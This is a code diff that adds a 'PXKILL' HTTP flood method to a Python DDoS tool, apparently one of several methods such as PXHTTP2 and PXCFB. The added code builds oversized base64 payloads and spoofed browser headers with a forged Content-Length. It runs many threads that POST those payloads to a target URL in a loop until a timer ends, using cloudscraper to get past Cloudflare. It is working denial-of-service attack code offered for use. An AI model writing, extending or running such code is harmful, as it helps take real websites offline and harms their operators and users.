@@ -2,10 +2,71 @@ import httpx, threading, cloudscraper, requests
 import argparse
 import undetected_chromedriver as uc
 import random, datetime, time
+import hashlib
+import base64
 from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from fake_useragent import UserAgent
 from requests.cookies import RequestsCookieJar
+
+def random_data():
+    random_payload = [
+        {
+            'A': base64.b64encode(
+                    hashlib.sha256(('AAAAAAAAAAAAAAAAAAAAA' + str(random.randint(6000, 12000))).encode()).digest()
+                ).decode() * 16384,
+        },
+        {
+            'B': base64.b64encode(
+                    hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()
+                ).decode() * 16384,
+        },
+        {
+            'C': base64.b64encode(
+                    hashlib.sha256(('CCCCCCCCCCCCCCCCCCCCC' + str(random.randint(6000, 12000))).encode()).digest()
+                ).decode() * 16384,
+        }
+    ]
+
+    return random.choice(random_payload)
+
+def random_headers():
+    headers_list = [
+        {
+            'User-Agent': UserAgent().chrome,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
+            'Content-Length': '500000000',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'TE': 'trailers',
+        },
+        {
+            'User-Agent': UserAgent().chrome,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
+            'Content-Length': '500000000',
+        },
+        {
+            'User-Agent': UserAgent().chrome,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
+            'Content-Length': '500000000',
+            'Upgrade-Insecure-Requests': '200',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+        }
+    ]
+
+    return random.choice(headers_list)
 
 def get_cookie(url):
     global useragent, cookieJAR, cookie
@@ -356,6 +417,39 @@ class Method:
         def start(self):
             return self.Attack()
 
+    class PXKILL:
+        def __init__(self, url, thread, time, proxy):
+            self.proxy = proxy
+            self.url = url
+            self.thread = thread
+            self.time = time
+            self.scraper = cloudscraper.create_scraper()
+
+        # Memulai thread untuk melakukan attack
+        def Attack(self):
+            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
+            threads = []
+            for _ in range(self.thread):
+                thread = threading.Thread(target=self.PXKILL, args=(self.url, until))
+                thread.start()
+                threads.append(thread)
+
+            for thread in threads:
+                thread.join()
+
+        def PXKILL(self, url, until_datetime):
+            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+                headers = random_headers()
+                payload = random_data()
+                try:
+                    self.scraper.post(url, headers=headers, data=payload)
+                    requests.post(url, headers=headers, data=payload)
+                except:
+                    pass
+
+        def start(self):
+            return self.Attack()
+
 class Runner:
     def __init__(self, args):
         self.args = args
@@ -376,4 +470,5 @@ if __name__ == '__main__':
     parser.add_argument('-tpe', '--tpe', type=str, help='ThreadPoolExecutor', metavar='150-300', default=150)
     parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO', required=True)
     args = parser.parse_args()
+    get_cookie(str(args.url))
     threading.Thread(target=Runner.start()).start()
